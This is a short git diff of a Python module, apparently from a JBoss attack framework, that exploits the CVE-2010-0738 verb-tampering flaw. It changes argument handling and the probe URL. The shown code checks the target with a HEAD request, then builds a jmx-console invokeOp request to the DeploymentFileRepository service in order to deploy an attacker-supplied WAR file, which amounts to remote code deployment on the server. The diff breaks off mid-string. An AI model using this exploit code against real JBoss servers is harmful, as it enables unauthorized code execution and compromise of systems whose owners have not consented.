@@ -13,6 +13,7 @@ class Auxiliary:
         self.name = 'JBoss Verb Tampering (CVE-2010-0738)'
         self.versions = ["4.0"]
         self.flag = 'verb-tamper'
+        self.enable_args = True
 
     def check(self, fingerprint):
         """
@@ -32,14 +33,13 @@ class Auxiliary:
         utility.Msg("Checking %s for verb tampering" % fingerengine.options.ip,
                                                        LOG.DEBUG)
 
-        url = "http://{0}:{1}/jmx-console/HtmlAdaptor".format(fingerengine.options.ip,
-                                                              fingerprint.port)
+        url = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
 
         response = utility.requests_head(url)
         if response.status_code == 200:
             utility.Msg("Vulnerable to verb tampering, attempting to deploy...", LOG.SUCCESS)
 
-            war_file = abspath(fingerengine.options.deploy)
+            war_file = abspath(fingerengine.options.verb_tamper)
             war_name = parse_war_path(war_file)
             tamper = "/jmx-console/HtmlAdaptor?action=invokeOp"\
                      "&name=jboss.admin:service=DeploymentFileRepository&methodIndex=5"\
